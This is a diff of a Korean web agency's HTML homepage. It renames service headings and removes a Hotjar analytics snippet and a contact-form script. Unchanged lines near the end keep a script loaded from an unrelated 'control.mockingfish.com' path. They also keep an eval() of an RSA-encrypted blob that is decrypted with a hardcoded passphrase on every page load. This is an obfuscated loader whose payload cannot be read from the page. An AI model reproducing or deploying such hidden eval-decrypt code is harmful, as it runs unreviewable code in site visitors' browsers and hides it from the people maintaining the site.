@@ -85,7 +85,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="mobile-application-development.html" class="service_blue">기획팀</a></h3>
+                        <h3><a href="mobile-application-development.html" class="service_blue">웹디자인</a></h3>
                         <p><a href="" rel="nofollow">마케팅전략수립</a></p>
                         <p><a href="" rel="nofollow">기획설계</a></p>
                         <p><a href="" rel="nofollow">사이트기획</a></p>
@@ -97,7 +97,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="digital-strategy.html" class="service_yellow">디자인팀</a></h3>
+                        <h3><a href="digital-strategy.html" class="service_yellow">퍼블리싱</a></h3>
                         <p><a href="" rel="nofollow">웹디자인</a></p>
                         <p><a href="" rel="nofollow">컨텐츠개발</a></p>
                         <p><a href="" rel="nofollow">UI/UX기획</a></p>
@@ -109,7 +109,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="app-marketing.html" class="service_red">개발팀</a></h3>
+                        <h3><a href="app-marketing.html" class="service_red">프론트엔드</a></h3>
                         <p><a href="" rel="nofollow">웹프로그래밍</a></p>
                         <p><a href="" rel="nofollow">웹사이트구축</a></p>
                         <p><a href="" rel="nofollow">서버/호스팅관리</a></p>
@@ -121,7 +121,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="clickable-prototype.html" class="service_blue">유지보수팀</a></h3>
+                        <h3><a href="clickable-prototype.html" class="service_blue">백엔드개발</a></h3>
                         <p><a href="" rel="nofollow">웹프로그래밍</a></p>
                         <p><a href="" rel="nofollow">웹사이트유지보수</a></p>
                         <p><a href="" rel="nofollow">서버/호스팅관리</a></p>
@@ -133,7 +133,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="mobile-app-maintenance.html" class="service_yellow">테스트팀</a></h3>
+                        <h3><a href="mobile-app-maintenance.html" class="service_yellow">안드로이드</a></h3>
                         <p><a href="" rel="nofollow">웹프로그래밍</a></p>
                         <p><a href="" rel="nofollow">웹사이트테스트</a></p>
                     </div>
@@ -143,7 +143,7 @@
                         <div><span></span></div>
                     </div>
                     <div class="service-content">
-                        <h3><a href="mobile-ui-ux-design.html" class="service_red">영업팀</a></h3>
+                        <h3><a href="mobile-ui-ux-design.html" class="service_red">아이폰</a></h3>
                         <p><a href="" rel="nofollow">영업</a></p>
                     </div>
                 </div>
@@ -203,16 +203,6 @@
 
 
 
-<script>
-(function(h,o,t,j,a,r){
-h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
-h._hjSettings={hjid:955845,hjsv:6};
-a=o.getElementsByTagName('head')[0];
-r=o.createElement('script');r.async=1;
-r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
-a.appendChild(r);
-})(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
-</script>
 
 
  
@@ -233,54 +223,7 @@ a.appendChild(r);
 <script src="js/home.js"></script>
 <script defer src="js/main.js"></script>
 <script defer src="../control.mockingfish.com/js/015715.html"></script> 
-<script>
-    (new WOW).init(), $("#contactusForm").click(function() {
-            username = $.trim($("#username").val()), emailid = $.trim($("#email").val()), content = $.trim($("#contents").val());
-            var e = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-            return "" == username ? ($("#error_msg").show().html("Please enter your name"), $(".user_text1").addClass("error"), !1) : (username.length <=1) ?  ($("#error_msg").show().html("Name should be greater than 1 character"), $(".user_text1").addClass("error"), !1) :(!username.match("^[a-zA-Z ]{2,30}$")) ?  ($("#error_msg").show().html("Only alphabets are allowed"), $(".user_text1").addClass("error"), !1) : e.test(emailid) ? "" == content ? ($("#error_msg").show().html("Please enter your message"), $(".user_text1").addClass("error"), !1) : (url = "contactus.html", void $.post(url, {
-                username: username,
-                email: emailid,
-                contents: content,
-                country: "NewLetterfrom"
-            }, function(e) {
-                return 1 != e ? ($("#error_msg").show().html(e), $(".user_text1").addClass("error"), !1) : ($("#error_msg").hide(), $("#username").val(""), $("#email").val(""), $("#contents").val(""), $("#success_msg").show(), $("#success_msg").removeClass("fadeout"), $("#success_msg").addClass("fadein"), setTimeout(function() {
-                    $("#success_msg").hide()
-                }, 3e3), $(".contact-form-holder").removeClass("animate"), void 0)
-            })) : ($("#error_msg").show().html("Please enter your email address"), $(".user_text1").addClass("error"), !1)
-        }), $(document).ready(function() {
-            $("#testing").waypoint(function(e) {
-                "down" === e ? ($(".header_outer").addClass("scrolled"), $(".mobile-menu-trigger").addClass("scrolled")) : ($(".header_outer").removeClass("scrolled"), $(".mobile-menu-trigger").removeClass("scrolled"))
-            }), $(".odometer").html(0), $(".snapshots-section").waypoint(function() {
-                window.odometerOptions = {
-                    format: "(,ddd)",
-                    animation: "count"
-                }, setTimeout(function() {
-                    $(".odometer1").html(200), $(".odometer2").html(50), $(".odometer3").html(5), $(".odometer4").html(120), $(".odometer5").html(99), $(".odometer6").html(94)
-                }, 500)
-            }, {
-                offset: "50%"
-            })
-        }),
-        function(e) {
-            enquire.register("screen and (min-width:1025px)", function() {
-                e(document).ready(function() {
-                    e("body").waypoint(function() {
-                        e("body").toggleClass("waypoint-on")
-                    }, {
-                        offset: "0%"
-                    }), e(".snapshots-section").waypoint(function() {
-                        e("body").toggleClass("black-bg")
-                    }, {
-                        offset: "50%"
-                    }), e(".common_section.services").waypoint(function() {
-                        e("body").toggleClass("black-bg")
-                    }, {
-                        offset: "50%"
-                    })
-                })
-            }, !0)
-        }(jQuery);
-</script>
+
 <script src="../cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.min.js" type="text/javascript"></script>
 <script type="text/javascript">
     eval(cryptico.decrypt('BnkN0LfQ68HjbO6kKFWANlqJ6u4nnquVipoNgOsGYZvJ6EBsPuDZWFUCp4nsMiy52RG3pJOyaBn1UjqL84QEndvcOkwv9DkzaC6UTzQdW5cE5O98T+GaXBx7/l61i3ABNCpjVnfd4xxswggBIxv4fDnFTmTYqG4Kzg5xWUVxqek=?kg5Uqs+iAnli3CkAED0FEuwwVjPZYAHNPrY0oWeqBuRPRaRl7UuoyNtcIDiIOYcMb3LN4o+q6rDxghnGJylPdZLn0X3LKtlwvA91KPhukGXEcGrRIDjy9TneXFeN9TP+TAMJ5mzRr6bnk8YCbhdhZ+n4j4aiNfEA9a9A7EKvLWLIcrFL+O6GI0heKF/dD6W/C1LxcEYffzvZwyMyO6wlC1dBdGYEAiZm4Z0bTFw+40r78bSWv3AnwH3LCbLd4kdvQKnJXgJPgwko8dr/cPiybRZuY/PVWzlzhEdMkkSVk5MgXP9jwJ8xdzPj6RvpXdT0Q0w1Ur54IfsLi2GMfYACtCna5E50dg6ISRN+WX9bU0cTAG/FBE/OXpBm0w5/xruWQf9qUGWTpmBTncP2CBippLqwIfl/0CFYSzGZbntYHjQ0h93HUUpb5PnIrVId7qBw+HHcgO3Wjjws/mr+JVZk/w==', cryptico.generateRSAKey('1bb19d64c5af4be197d9c19c29c571e4', 1024)).plaintext);
